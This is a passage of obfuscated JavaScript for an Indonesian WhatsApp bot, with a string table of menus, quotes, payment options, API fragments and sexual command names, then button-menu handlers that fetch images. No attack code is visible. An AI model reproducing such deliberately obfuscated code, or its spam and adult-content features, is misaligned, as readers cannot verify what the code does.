'rdianto','g\x20yang\x20per','an\x20tidak\x20m','7000000000','suka\x20mabar','menikah\x20me','ytmp4doc','k\x20yang\x20kit','ng\x20bikin\x20k','sheet','.be/w4iQ4r','mama_gina','Masukkan\x20q','keinginan\x20','rksmn','pp.net','dan\x20memuka','ikin\x20senen','n/vnd.open','&apikey=ha','female','\x20lambat.\x20J','tau\x20bokap?','pake\x20foto\x20','berlatih?”','ut\x20itu\x20pen','onlyOwner','you','spank','ukhty','caption','a\x20peluang\x20','rce/get/?s','erlebih\x20da','verify','kiss','hubunganny','_Untuk\x20dur','\x20mengerti\x20','e\x20qr\x20code?','manga','ytmp3\x20[lin','im\x20mungkin','tau\x20putri\x20','bagian\x20ter','cope%22%3A','ndung,\x20Pag','n\x20adalah\x20p','karena\x20mer','ttonId','vbDrW','huangzitao','512@s.what','makin\x20bany','kXrt+8eqBg','\x20terus\x20saj','%22%2C%22s','\x20dalam\x20sua','MP3','know\x20anyon','ECT','mangat\x20ada','LGCzY','ku\x20tidak\x20b','kita\x20tahu.','ebelum\x20jad','sApp-','a\x20sekampun','nya\x20klo\x20ma','buah\x20kelua','Finish','oVuvU','dohkyungso','video','mlVbP','Hampir\x20sem','\x20command_','k\x20doang\x20ha','ya\x20milik\x20t','ce\x20baca\x20su','Aku\x20bisa\x20s','\x20untuk\x20dir','vo18','ngin\x20mengu','bagimu.','“Pintar\x20it','jFpjq','success','ayu','h\x20list\x20emo','qJbSf','orang\x20yang','Lelaki\x20yan','ain\x20tertaw','n/pdf','mGhSc','hn2Sqy4nHf','*Title*\x20:\x20','hak\x20kamu,\x20','qr_dana18','hbkfE','731348GnwzaP','ile/d44d0c','HrYUZ','ipt,\x20*/*,\x20','qyjCX','\x0a\x0a💦\x20Title\x20','\x0a🤠\x20ID\x20:\x20','feetg','tengah\x20jam','\x0a•\x20HADS\x0a•\x20','vo13','ttp4','\x20kakinya\x20h','ika\x20Anda\x20i','dmenu','⏰\x20Runtime','xtMessage','lucu','ile/9fc9b3','ing\x20berpen','sapp.net','Hai\x20@','bG0=','suksesan\x20y','./image/','\x20Semoga\x20ha','Hal\x20terbai','toFormat','\x20tepian…be','tits','“Menahan\x20g','tiktokmusi','ndapatkan\x20','zono','ument.pres','HPUZD','orang\x20nges','ytmp4ajafh','Ramein\x20kak','i-zeeoneof','P-mu.\x0a2.\x20P','61d42f7cac','minjamkan\x20','supan/v2/','\x20bayar\x20pak','P3\x0a🤠\x20ID\x20:\x20','ponseMessa','a\x20yang\x20And','opay18','ru.\x20Malaha','document','galanya\x20ba','ge\x20photoox','an\x0a5.\x20Sele','d\x20by\x20@','da…kebohon','adi\x20udah\x20p','mu\x20jadikan','m\x20ke\x20salah','aFqQV','GET','a!\x20Upgrade','ndekati\x20ti','“Sesungguh','drop\x20emot\x20','a\x20tersebut','Meskipun,\x20','IQOuN','aHBUi','balik\x20kepa','ile/db6f0f','Eror','instareel','v9gIBMu9tX','getDate','“Sayang…\x20t','pagar\x20peli','erah\x2024\x20ja','eiNhR','hbqkZ','di\x20bawah.','drop\x20kutip','a4e88.jpg','\x20apa\x20lagi\x20','PUBLIC\x20-\x20M','ytmp3doc\x20','JehxM','\x20masa\x20depa','lmPmM','luOMv','buah\x20seped','_\x0a•>\x20Nomor','\x20:\x0a1.\x20Buka','asa\x20orang\x20','ta\x20lupa,\x20s','a\x20atau\x20pak','\x20sekarang,','a\x20dengan\x20k','infobot','69280.jpg','buk\x20belaja','h\x20dia\x20deng','nicholas','rus\x20tetap\x20','Menampilka','Sebuah\x20mej','sourcecode','t1000','tik,.\x20Rusa','all','\x20menjadi\x20j','mu\x20telah\x20m','sername\x0aim','tion','),\x20tunggu\x20','YjDqN','5.\x20Selesai','esponse','ria,\x20beri\x20','DER*\x20」','kirim\x20foto','tidak_kak','*_Cowo_*','ketik\x20','Irefd','CKER','location','/p_2032o0l','u\x20sange','epadanya..','\x20donasi\x20vi','nenek\x20moya','h\x20banyak\x20u','tickle','u\x20want\x20to\x20','6a8f7fc99d','uk\x20mengger','nkAIn','dino_kunin','qgFmB','jKNPu','ng\x20dihabis','*📽️\x20YOUTUBE','ile/ec84cb','pinterest2','```Searchi','xJwIbhBJYz','CvAqQ','alaman','👀\x20Tidak','\x20pergi\x20jau','wrmUH','\x20mereka\x20se','5c293c4fd5','langsung_d','ku\x20anak\x20pu','.mp3','VERIFY','nd_','HP-mu.\x0a2.\x20','tunggu\x20fil','rsakit-sak','75616e6ac9','e\x20nomor\x20aj','.net','origin','terasa\x20rin','\x20mungkin.\x20','\x20:*\x201080kb','\x20i\x20love\x20u,','“Kesuksesa','nnel/UCdzW','\x203\x20hari','size','\x0a🎃\x20Size\x20:\x20','dak\x20untuk\x20','h,\x20dan\x20seb','/crush','ah\x20ga\x20sola','ak\x20takut\x20m','ngif','a\x20tidur\x20ka','enjadi\x20ora','scribe\x20htt','sedikit\x20da','f31132917d','utu.be/1O2','fAsrk','jaminan\x20ke','OUP\x20OPEN\x20','instavideo','china','an\x20the\x20lim','i\x20size\x20thu','jBOQv','QWKLc','jvSXw','♐\x20Menu\x20ke-','atkan!*','Button\x20mes','\x20yang\x20kamu','tap\x20seimba','jpegThumbn','utan\x20sesua','le-','aksana','instavid','yana','dzWwbApjky','ytmp4ajahd','mWjIY','lebih\x20baik','u.\x20Asal\x20ja','solo','ge\x20group\x20c','d6da00d7ae','lah\x20menjad','textpromen','start','an\x20(ganjar','ge\x20asupan\x20','DE*\x20」','eXI.enc','group\x20open','luYmq','akan\x20membe','hadap\x20sesa','ara\x20tidak\x20','ebuah\x20impi','\x20kuat\x20dan\x20','-PLAY\x20MP4*','FsUup','BANGET\x20NGG','\x20saya\x20diam','h.\x20Jangan\x20','dikuburkan','\x20Alesanya?',':-1:-1:col','tahu\x20kunci','_\x0a\x0aCaranya','ah\x20mengert','emium','.be/-8hpzK','NkBAVg8GMe','\x20diam?','ntukan\x20tem','g,\x20kuning\x20','\x20per\x20hari\x20','aUT5WmYV','wpjOB','ja).”','AM\x20STORY*\x20','jomblo','eJtVP','U7WJE','nama','ulit,\x20tapi','app','rim\x20kesini','“Jika\x20anda','use\x20the\x20al','au\x20tiktok\x20','dagang\x20kak','DUfbi','parkchanye','dalah\x20lela','ge\x20convert','\x20fitur\x20ini','mu\x20dengan\x20','videoId','m\x20terdafta','rkgreen|li','quotedM','ource_url=','hinata','\x20janganlah','ilangan\x20se','langsung_g','mMDaV','japan','kimjondae','mp4','あ\x20Group\x20Al','Sebutkan\x20k','push','geCount','ana?\x20','gimana\x20bro','™©\x20|\x20','\x20akun\x20kamu','gacha\x20ceca','Putus\x20cint','alquran_au','\x20gunung,\x20t','\x20itu\x20kunin','ih\x20kuat\x20da','nt=on:tran','register\x20o','JzVQA','0BcXjyBDkN','mediaType','ah\x20pinjama','pa\x20kita\x20si','vUuQW','📊\x20*Quality','a…Masih\x20ad','an-temanmu','\x20sange','error','ngungkanla','\x20mau\x20sewa\x20','profilePic','pJweB','LKDhS','random','🎦\x20*Y\x20T\x20\x20P\x20','lo\x20pernah\x20','akan\x20berul','readFileSy','at.\x20Biar\x20a','a\x20menjadik','AKINAH\x20(Se','Terjadi\x20ke','ganti\x20nama','di\x20ringan,','Masalah\x20ak','ton\x20silahk','saja\x20dapat','O\x20\x0a\x0aPowere','tan\x20terbes','source\x20cod','log','ama\x20kamu\x20j','u\x20hanya\x20un','.com/api/c','mencintai.','neko','a4639.jpg','utup.','an.herokua','mand\x20ya\x20sa','ya.\x20Andai\x20','daripada\x20h','tweet','pembayaran','ahan,\x20yasu','a\x20di\x20negar','lewd','✓\x20OWNER','\x20:\x20_@','on\x20below','ihat\x20siapa','🐭\x20*Filesiz','ali\x20dan\x20ca','neofetch\x20-','\x20ini\x20adala','\x20takut\x20kam','chat\x20ke\x20ko','jhope','kan\x20menert','ana18','tuk\x20user\x20p','8s1.jpg','KKzmh','ang\x20bisa\x20m','ungi\x20tanpa','\x20:\x20_','Jika\x20menu\x20','langsung_o','tiktok.com','Bot','rnah\x20jatuh','sparency_c','igfoto','nks\x20to','rimu\x20jaket','kin\x20banyak','GTBcW','sage\x20grup\x20','o\x20pas\x20di\x20s','erapa\x20meni','anan,\x20tapi','api\x20memban','Emoji-Open','ICtvX','\x20VIDEO\x0a\x09\x09\x09','alahkan\x20or','\x20Title\x20:\x20','yRPRG','nstagram.c','\x20terlebih\x20','Tuhan\x20memb','riri','teriak\x20\x22\x20a','ttdownload','FUL\x20CLOSIN','an,\x20namun\x20','qdxHe','207345hGHRYt','i-laki\x20mau','ekarang\x20ju','tqto','gold','aling\x20dita','chacecan\x20c','6199803015','ge\x20otherme','ih!\x20Don\x27t\x20','du,\x20ini\x20be','\x20contoh\x20:\x20','same-origi','a\x20lupa,\x20Se','mu\x20adalah\x20','mangayutri','Emoji-Face','cqEXw','u\x20seseoran','🐣\x20*Title*\x20','t\x20dipastik','Pilih\x20sala','parse','ajzFb','foto\x20pacar','afbZq','ownerku','\x20Bot\x20sebag','ge\x20gacha\x20c','yat','Mediafire\x20','enjadi\x20kap','kGxxp','y18','bilang\x20\x22i\x20','anya\x20pende','kimtaehyun','gt\x20kamu\x20ch','k|blue|bro','⋮☰\x20BACK','aUSbs','woof','cmm','WFxSA','lizard','support','h-jauh\x20kan','```SUCCESS','idak\x20berus','\x20Nama\x20:\x20_','ttmp3','gIzNV','l-hal\x20keci','*Ext*\x20:\x20MP','3n1n1Kbt6a','Score','TPlHl','tiktoknowm','w.pinteres','dupnya.','\x20&\x20leave','ntaimu.',',\x20Setelah\x20','pussy_jpg','ile/ad77c1','\x20:\x20','ya\x20juga\x20ti','idupan\x20kit','Moji-','na\x20kalau\x20s','pDYdp','sia\x20yang\x20s','jelek.”','use\x20the\x20gr','h\x20memberi\x20','adi\x20diam-d','ku\x20saja.','prank\x20chat','lamnya\x20aku','Pura\x20pura\x20','u\x20bilang\x20b','ya\x20kak🥰','n\x20rumah\x20mu','ma-sama.','h\x20list\x20men','id:\x2018)\x0a\x0a•','results','g.us','\x20ninggalin','DANA.\x0a4.\x20d','PQztz','kaga_kouko','PR-ku\x20adal','HlODR','ardianto','akan\x20menja','deliveries','aat\x20masih\x20','1614069378','k\x20ngiler\x20d','STC\x20CMD\x20PL','ujasX','k\x20dikerjak','animemenu','jfpZv','pat-gandak','AskLO','l\x20seseoran','funmenu','Video\x20(360','i\x20apapun\x20y','mu!','0@s.whatsa','truth','Lwsuc','Qs.\x20Al\x20Had','salah\x20past','Ada\x20tips\x20a','Usernameny','lempar.”','a\x20:\x0a1.\x20Buk','method','mbPCI','copyNForwa','&color=red','imageMessa','\x20bersedeka','use\x20the\x20ga','slim)\x20pern','LIST\x20MENU\x20','*MEDIAFIRE','g\x20auto\x20ban','getDay','MD\x20\x1b[1;37m','qVZFj','indonesia','n\x20idealmu\x20','Bilang\x20\x22KA','🐰\x20*Filesiz','igdl','\x20normal\x20di','up\x20saya','\x20tetangga,','kerasukan\x20','Klik\x20next\x20','TxSoy','lupa\x20join\x20','legra.ph/f','playmp4','kimjunmyeo','then','i\x20lima\x20itu','ai\x20admin\x20t','_transpare','input','termotivas','\x20kamu\x20putu','jimin','_\x0a\x0a*PAYMEN','&color=cya','katacaklon','asuna_yuki','n/json,\x20te','ak\x20orang?\x20','ge\x20Alphabo','Ingin\x20Namb','bisa\x20kita\x20','Semakin\x20ra','\x20impianmu\x20','status','NqxTD','eyakinkan\x20','rsebut','ra\x20gara\x20si','SELF\x20-\x20MOD','fake','\x20Nominal\x20p','glasses','iFYSU','\x20yang\x20bera','sendMessag','depan\x20tak\x20','746469uwUgTx','luhan','Reply\x20pesa','ndiri.','n.\x20Tapi,\x20b','en?type=tr','tt\x20anjimmm','rikagusria','sh1.jpg','hanlah\x20ter','sage\x20Tidak','tahu,\x20Sema','Alquran\x20Mu','qzSbF','hTcaZ','u\x20bukan\x20ti','\x20yang\x20cerd','alcakenya','ID4Fmo9w','XHGuM','mediaKey','hIasg','dan\x20mengun','ang\x20kali.\x20','t%22%3A%7B','ta\x20bertepu','\x0aJoin\x20ya\x20@','use\x20the\x20ph','KsOfE','danya.\x20Bal','2279535PzzHaZ','n\x20berkeing','nt\x20Ovo','ile/b14ea2','Siapa\x20nama','NA\x20&\x20GOPAY','masturbati','Belas\x20kasi','Silahkan\x20c','adi\x20kusir\x20','cmKxa','ytmp3','ikian,\x20kec','?apikey=of','\x20jadi\x20paca','dSaveMedia','99c5f.jpg','Emoji-LG-','UzXfK','record\x20voi','a\x20sama\x20ora','\x20sahabat?(','an\x20button\x20','masih\x20di\x20i','harus\x20kamu','net/v2/?lc','roup_','lonte','\x20ke\x20stiker','rows','ied\x20does\x20n','enu','OMRXT','BOT','\x20L\x20A\x20Y*\x0a\x0a💦','gif','tpE=','\x20Jangan\x20pe','kos.life/a','sage\x20menu','upport\x202','\x20yang\x20dulu','apa\x20ketaku','3337@g.us','「\x20*SELF-MO','AUDIO','h\x20apa\x20yang','\x20amongus\x20u','olor=fffff','https://ha','🦁\x20*Ext*\x20:\x20','AeAqs','nyurl.com/','use\x20the\x20ta','remium\x20saj','set\x20sticke','sule\x20sampe','ymenu','\x20Fisika.\x20L','Terbuka\x20un','video\x20','mzaQD','ge\x20tagmenu','sageFromCo','aslah\x20deng','\x20pedagang\x20','\x20ada\x20darah','ziva','garuh\x20kepa','@s.whatsap','kas,\x20dll','\x20akar\x20untu','Apakah\x20tak','use\x20the\x20fu','yang\x20kita\x20','embayaran\x0a','mikosiba','ar\x20kamu?','ODE','jak\x20sini.”','car\x20teman\x20','\x20berusaha.','mewujudkan','an\x20kebodoh','p.com/E8NE','i\x20%batre\x20k','kamu\x20semua','ang\x20can\x20i\x20','code','processing','sa\x20tidak\x20m','\x20nona\x20cant','(main\x20bare','intaimu\x20ad','use\x20the\x20co','Sc\x20*SELF-B','Next\x20\x20for\x20','euse','ka\x20kamu\x20ma','Cinta\x20adal','us\x20berhasi','\x20Dana','terakhir\x20b','yang\x20memba','UGrHK','kermenu\x20co','\x20Gopay','pp.com/api','8ball','previewTyp','IiCyj','nnya.”','dengan\x20com','iri.','\x20kesulitan','Hi\x20@','-PLAY\x20MP3*','HRLLS','cker\x20Video','zettai','suga','List\x20Messa','elin\x20ಠ︵ಠ','at.whatsap','rYJYs','♎\x20Menu\x20ke-','Jika\x20whats','cum_jpg','*BROADCAST','json','mbawa\x20aku\x20','na\x20berhubu','MDCbV','yukino','https://f.','jiso','々\x20Judul\x20:\x20','username','ytmp4aja','jar,\x20semak','ile/277163','oAMxE','en68','bijaksanaa','dak\x20laku,\x20','o=decrease','DANA\x20via\x20H','i\x20selingku','a\x2024\x20jam','nmenu\x20comm','🪀\x20*ALPHABO','%22pins%22','\x20seseorang','adalah\x20yan','g\x20sukses\x20a','endidik\x20se','g\x20yang\x20bis','e\x20:\x20','g\x20kreatif\x20','kan\x20berpas','2d0c2195ab','bot_','eseorang\x20y','k\x20sebelah\x20','IzrQu','data','\x20bohong,\x20i','low&apikey','api-create','businessOw','groupSetti','i\x20yang\x20ter','akame','Mendidik\x20s','ar\x20sambil\x20',',\x20kamu\x20mau','sbob','PnpcE','image\x20effe','timestamp','d89eeaefc6','\x20bertahan\x20','sections','makermenu','lokAN','isa\x20makan\x20','https://mm','ngat\x20benci','r\x20sejati\x20p','Sebenarnya','Link\x20:\x20htt','includes','qr_gopay13','mu\x20yang\x20pe','PAY','ya.','a\x20dengan\x20m','Emoji-Mess','mua\x20orang\x20','\x20coba\x20ulan','kutin','teguh,\x20Tuh','ge\x20makerme','age!','instaphoto','\x20yang\x20kita','sa\x20bahagia','mu\x20belum\x20s','FuVEh','h\x20baik\x20lak','\x20aku,\x20itu\x20','kira\x20udah,','♈\x20Menu\x20ke-','title','RESPONSE','gamu?','Emoji-Twit','\x20want\x20to\x20d','aya\x20takuti','Maret','prepareMes','ang\x20daripa','hati\x20yang\x20','Click\x20butt','lin\x20aku,\x20a','hkan\x20dipil','a\x20apa-apa.','mburu.','ile/97b236','njadi\x20tuan','\x0a\x09\x09\x09\x09\x0a_Upl','mediafire','lsQpc','getHours','s\x20bot_','katailham','Hasil\x20Penc','gubah\x20masa','EONE\x20OFC','trap','\x20sempurna,','\x20tag\x20membe','bayar_dana','spam','engan\x20memb','headerType','7c110.jpg','kan\x20beraki','llyIi',',\x20aku\x20tak\x20','Kalau\x20kamu','PAYMENT\x20OV','AY\x20MUSIC','JASA\x20SEWA\x20','☪️\x20Menu\x20ke-','dari\x20yang\x20','audio/mp3','h)\x27:force_',',\x20supaya\x20s','rkanmu\x20mel','rga','\x20akan\x20menj','ilkan\x20lebi','endiri','&crewmate=','ebih\x20besar','L\x20A\x20Y\x20\x20M\x20P','USD','seseorang,','udian.”','quoted','ptions','\x20tidak\x20bis','47E51FFDFD','erorLink','ada\x20akhirn','vZLUv','FZNjAqSMng','libwebp','views','bnfsn','Started\x20:\x20','ikit\x20yang\x20','aiumu.','982926DNighe','alan\x20untuk','\x20bahasa\x20da','2Fpins%2F%','dikit\x20perk','\x20Bisaku\x20cu','Selasa','lah\x20stimul','ataannya.','tu\x20hak\x20kam','\x20|\x20Request','orang.','de\x20diatas\x20','video\x20ini\x20','ohsehun','an\x20dari\x20ke','c/pc\x20selam','gan\x20takut\x20','🐭\x20*Ext\x20:*\x20','ecan','rdianto-ch','wal\x20dari\x20s','「\x20*PUBLIC-','a\x20Masterca','Oktober','jLGbf','nita\x20yang\x20','baik\x20dan\x20b','an\x20dikirim','\x20*DELIVERE','uga?','cuma\x20menci','e\x20sini','rah.\x20Saya\x20','pun\x20peremp','f\x20atau\x20tek','utu.be/ERG','\x20valid\x20ata','r\x20yang\x20coc','lisa','ode\x20diatas','Januari','%7D%7D&_=1','\x20a\x20link_','emilia','\x20owner\x20ku\x20','pian\x20hadir','ian','cha\x20cogan\x20','ripada\x20sal','hHlVS','\x20akan\x20tera','indah.”','da\x20diri\x20se','an.”','04eea.jpg','\x0a\x0a_For\x20the','https://ap','gin\x20menjad','https://ww','Reply\x20atau','igphoto','stanzaId','itu\x20suka\x20s','ayuzawa','top4top.io','i\x20memegang','pap\x20ke\x20sal','en-US,en;q','-beratnya\x20','Jika\x20hujan','aksana\x20tid','gRXGv','\x20untuk\x20men','Saya\x20tidak','IcWvq','youtube.co','l\x20pada\x20kal','Url','di\x20ringan','use\x20the\x20an','Bila\x20Anda\x20','1418592bAEUpN','•\x20\x20','lnya\x20cinta','kenapa?','itu\x20tidak\x20','i\x20akan\x20ada','an,\x20dan\x20ji','bayar_gopa','scale=\x27min','upport\x20but','anmu.”','kimjong','ogan\x20menu','Emoji-Goog','ytmp3doc','\x20tahu,\x20sem','use\x20the\x20te','ntaranmu\x20t','gIaUJ','\x20ini.\x20Peke','t.com/','winry','\x0a\x0a\x0a•>\x20Nama','g\x20yang\x20pal','ntik\x20bukan','emas,\x20emas','participan','wanita\x20sam','Ram:','forwarding','fullName','e\x20media\x20se','MP4','ytmp3aja\x20','dmePA','NOMOR','it\x20is\x20pres','BjZx9tvY','indukan\x20ka','WM.mp4','.net/d/f/A','h\x20menjadi\x20','audio','BY\x20ZEEONE\x20','use\x20the\x20im','lKxyf','ndai.','uah\x20biola;','xVjVf','-vcodec','ang.','AKseK','gi\x20^_^','an\x20di\x20pili','stringify','ge\x20quotesm','Sebuah\x20neg','snap/post\x20','ku\x20gak\x20bis','an\x20bodohny','ang\x20intens','DISABLE\x20VE','ile/4c2e47','bodoh\x20dari','user\x20priva','g\x20Anda\x20cin',':\x20_','wA0mo','osoft-','_\x0a•\x20Nomor\x20','🔖\x20List\x20Sew','xzUPK','dan\x20hidup\x20','s\x20duluan\x20s','instagrams','seperti\x20se','“Dalam\x20pan','syania','ml.documen','i-alphabot','mah\x20Anda\x20m','qFCTS','ile/1599f5','adalah\x20tem','omcUO',':\x20https://','adi\x20buat\x20a','~\x20@','pernah\x20gak','ya\x20ngiler\x20','ada\x20selalu','pwankg','OUP\x20CLOSE\x20','aca\x2030\x20men','benarnya\x20k','groupmenu','ma,\x20bersik','gmenu\x20comm','GipFt','gi\x20setiap\x20','Pernah\x20suk','rue\x20/\x20not\x20','📍\x20Tanggal\x20','OskIw','\x20:*\x20720kbp','ak\x20makan\x20d','cuddle','know\x20sourc','untuk\x20meng','a\x20menyenan','b5e33a30ee','holo','an\x20Anda\x20si','elek.”','g\x20pas\x20lu\x20l','Choose\x20vid','\x20ilusi\x20yan','uLQGf','nnagen&tex','e|red|whit','utu.be/1r_','WYigg','oRKog',',\x20tetapi\x20t','977f4.jpg','QyQzU','ery%22%3A%','\x20hanya\x20dua','\x20gc/luar\x20g','igtv','653158378f','[\x1b[1;32m\x20C','LuiZT','cript\x20Bot\x20','\x20to','clutd','otesmenu\x20c','fileLength','Zlkzz','tode\x20lain\x20','berhasilan','Yang\x20palin','Kesabaran\x20','.herokuapp','YQtWO','VrDnW','syifa','and_','nda.”\x20–\x20P.','sApp','AGE\x20TO\x20STI','ukan\x20untuk','up\x20untuk\x20m','ge\x20storage','isYyy','an\x20yang\x20ba','nuju\x20kegag','nLjUb','gkRnd','apalagi\x20wa','buttonsRes','Sekarang\x20a','\x20hidup\x20leb','“Uang\x20buka','toString','5\x20jam','a,\x20namun\x20m','\x20takut\x20men','mimetype','kursi,\x20sem','tahuan\x20tan','bKVjS','88f9e.jpg','channel/UC','\x20nomor_sur','rena\x20kelap','nWpDlmrk','p.net','pt_','contextInf','mu,\x20siangn','vbYvS','📍\x20Waktu\x20:\x20','ps://youtu','&impostor=','c.us','TIumk','kaori_miya','ommand_','NOTE\x20！','1b207.jpg','⛎\x20Menu\x20ke-','kobot.xyz/','da\x20uang\x20ya','NcgRg','OFC','reply\x20mess','https://ch','ada\x20mereka','\x20disajikan','ami','runtime','AWaOB','grup\x20bot','source','maung,\x20ker','e*\x20:\x20','ih\x20lama.','dalah\x20peng','💌\x20Informat','Audio\x20(128','fromMe','ffect','ndai\x20cembu','isa\x20mencon','instastory','kr_robot','Membaca\x20se','takut\x20mera','dia\x20bales,','buttons','\x20Aplikasi\x20','listRespon','i\x20kunci\x20me','Upgrade\x20Pr','=ind&cf=fa','2e1.jpg','postor\x20=\x20t','us.','ku\x20di\x20tubu','relayWAMes','\x20https://i','rus\x20sewa\x20b','user','“Kegagalan','anal','amu\x20ningga','wUTiY','KzTGd','eorang\x20pri','iymWK','“Saya\x20tida','\x20nila\x20seti','Jika\x20Anda\x20','asa','ng\x20cantik\x20','alasannya\x20','length','Perbedaan\x20','a\x20inginkan','.com/api/a','hatsApp','pa\x20kita\x20su','webp','ument.word','.\x20Valery','ji\x20silahka','jahy','dalah...\x20T','hulu```','\x20selama\x20ia','T\x20NEW\x20VER.','PENDING','nerJid','tChLo','impostor\x20=','chitoge','begitulah\x20','an\x20senyuma','Rabu','\x20akun\x20mu\x20s','_Tunggu\x20be','🐺\x20*Link*\x20:','OT*\x20by\x20me','“Setiap\x20ma'];_0xa790=function(){return _0x43fe29;};return _0xa790();}if(sub_yt_zeeone_ofc==_0x1e23e4(0x6b8,0x14b,0x27d,0x436)+'n'){console[_0x1e23e4(0x31c,0x1ac,0x58e,0x777)]('\x1b[1;31m~\x1b['+'1;37m>',_0x1e23e4(0x9cb,0xcc1,0x896,0x6fd)+_0x593f96(0x834,0x544,0xd4d,0x5cd)+']',wib,color(_0x593f96(0x8fc,0xb18,0x4e4,0xc98)+_0x1e23e4(0x2d4,0x6ed,0x5ed,0x13d)+_0x593f96(0x9fd,0x63f,0x9e6,0x9ea)));var coganksk=await getBuffer(_0x593f96(0x343,0x54f,0x58c,0x274)+_0x593f96(0x842,0x7c4,0x341,0x83d)+_0x1e23e4(0x30c,-0x93,0x2bb,0x1c)+_0x1e23e4(0x8ec,0x91e,0x4fc,0x692)+'88e11.jpg');const _0x1dc4f8={};_0x1dc4f8['displayTex'+'t']='⋮☰\x20BACK';const _0x5233e7={};_0x5233e7[_0x1e23e4(0x474,0x1b4,0x200,-0x112)]=_0x593f96(0x312,0x6cd,0x747,0x675),_0x5233e7[_0x1e23e4(-0x146,0x41,0xc6,0x92)]=_0x1dc4f8,_0x5233e7['type']=0x1;const _0x22dfb4={};_0x22dfb4[_0x1e23e4(-0x223,-0x115,0x1de,-0xbe)+'t']=_0x1e23e4(0x2c7,0x832,0x59f,0xa04);const _0x2780c6={};_0x2780c6[_0x1e23e4(0x24c,-0x294,0x200,0x68c)]=_0x593f96(0x457,0x366,0x237,0x90b),_0x2780c6['buttonText']=_0x22dfb4,_0x2780c6[_0x593f96(0xb7e,0xe2c,0xbe4,0xe0d)]=0x1,sendButLocation(from,coganmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x5f6,0xf8,0x407)+ini_mark[_0x593f96(0x311,0x564,-0x182,-0xab)]('@')[0xba1+0x862+-0x1403],coganksk,[_0x5233e7,_0x2780c6],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='telegram\x20s'+_0x593f96(0xc0f,0xe19,0xa6d,0xd0a)){console[_0x593f96(0x76c,0xb65,0x496,0x438)](color(time,'magenta'),color('List\x20messa'+_0x593f96(0x497,-0x84,0x4e0,0x8fd)+'m\x20sticker'));var telesjtje=await getBuffer(_0x1e23e4(0x452,0x1a4,0x165,-0x109)+_0x593f96(0x842,0xab3,0xce9,0x90b)+_0x1e23e4(0x4e9,0x9ff,0x865,0x448)+'8a682c0e76'+_0x593f96(0xa6d,0xc18,0xee7,0xda5));const _0x367434={};_0x367434[_0x593f96(0x3bc,-0xb6,0x6a7,0x52d)+'t']='⋮☰\x20BACK';const _0x2a63e5={};_0x2a63e5['buttonId']=_0x593f96(0x312,0x3e1,-0x3e,0x5f7),_0x2a63e5[_0x593f96(0x2a4,0x6d7,0x6d0,0x6e6)]=_0x367434,_0x2a63e5[_0x593f96(0xb7e,0x8a0,0xd4a,0xcc3)]=0x1;const _0xd80448={};_0xd80448[_0x593f96(0x3bc,0x21a,0x76d,0x604)+'t']=_0x593f96(0x77d,0x49f,0x901,0xb9c);const _0x14b20a={};_0x14b20a[_0x1e23e4(0x634,0x9f,0x200,0x160)]=_0x593f96(0x457,0x944,0x535,0x99),_0x14b20a['buttonText']=_0xd80448,_0x14b20a[_0x593f96(0xb7e,0x9a6,0x960,0xec5)]=0x1,sendButLocation(from,telestiker(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x2df,0xf0,0x1fa)+ini_mark[_0x593f96(0x311,-0x10f,0x160,0x7cf)]('@')[-0x8*-0x21a+-0x1179+0xa9],telesjtje,[_0x2a63e5,_0x14b20a],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x1e23e4(0x748,0x61e,0x757,0x599)+'ct'){console[_0x593f96(0x76c,0x41d,0x91b,0x415)](color(time,_0x1e23e4(0x1a4,-0x1ac,0x17b,-0x34d)),color(_0x1e23e4(0x346,0x6ef,0x3a9,0x4f7)+_0x1e23e4(0x5f7,0xf23,0xa11,0x872)+_0x593f96(0xac5,0x74b,0xa69,0xca9)));var imagekskwo=await getBuffer(_0x593f96(0x343,0x80b,0x196,0x255)+'legra.ph/f'+'ile/4dfc9b'+_0x1e23e4(0x91f,0xa3a,0x745,0x6a8)+_0x593f96(0x58b,0x229,0x850,0x9f0));const _0xf52e4a={};_0xf52e4a['displayTex'+'t']=_0x1e23e4(0x4ac,0x829,0x5f8,0x5e8);const _0x2f329a={};_0x2f329a[_0x1e23e4(0x329,0x32,0x200,0x5b8)]=_0x593f96(0x312,0x5df,0x655,0x84),_0x2f329a[_0x1e23e4(0xb5,0x535,0xc6,0xe4)]=_0xf52e4a,_0x2f329a[_0x1e23e4(0x94f,0x778,0x9a0,0xa5c)]=0x1;const _0x4df5bd={};_0x4df5bd[_0x593f96(0x3bc,0x86e,0x5cd,0x1e9)+'t']=_0x1e23e4(0xf9,0x5e5,0x59f,0x28a);const _0x18e6f5={};_0x18e6f5[_0x1e23e4(0x21b,0x189,0x200,-0x305)]=_0x593f96(0x457,0x787,0x142,0x3cf),_0x18e6f5[_0x1e23e4(0x1b1,-0x130,0xc6,0x113)]=_0x4df5bd,_0x18e6f5[_0x1e23e4(0xba4,0xda3,0x9a0,0xc0b)]=0x1,sendButLocation(from,image_effect(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x1e23e4(-0x22d,0x1f,0xd3,0x39a)+ini_mark['split']('@')[-0x5a9+0x2455*-0x1+0x29fe*0x1],imagekskwo,[_0x2f329a,_0x18e6f5],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x76b,0x4a1,0x550,0x964)+'e'){console[_0x1e23e4(0x5b0,0x5ef,0x58e,0x534)](color(time,'magenta'),color('List\x20messa'+_0x1e23e4(0x5f9,0x96a,0x9e3,0xb38)+_0x593f96(0x8db,0xde1,0xc76,0x901)));var sourbwbbz=await getBuffer(_0x1e23e4(0x366,-0x7e,0x165,-0x92)+_0x593f96(0x842,0xb92,0x636,0x5ba)+_0x1e23e4(0x152,0x141,0x144,0x335)+'b5e33a30ee'+_0x593f96(0x3ee,0x4d,0x638,0x5ea));const _0x747941={};_0x747941['displayTex'+'t']=_0x1e23e4(-0x31,-0x190,0x18d,-0x377);const _0x47d597={};_0x47d597[_0x593f96(0x3de,-0xb8,0x5bb,0x820)]=_0x1e23e4(-0x2ee,-0x25,0x134,0x56),_0x47d597[_0x1e23e4(0x52d,0x452,0xc6,0x11)]=_0x747941,_0x47d597['type']=0x1;const _0x2bfd24={};_0x2bfd24[_0x1e23e4(-0x1b6,0x5b5,0x1de,0x142)+'t']='✓\x20OWNER';const 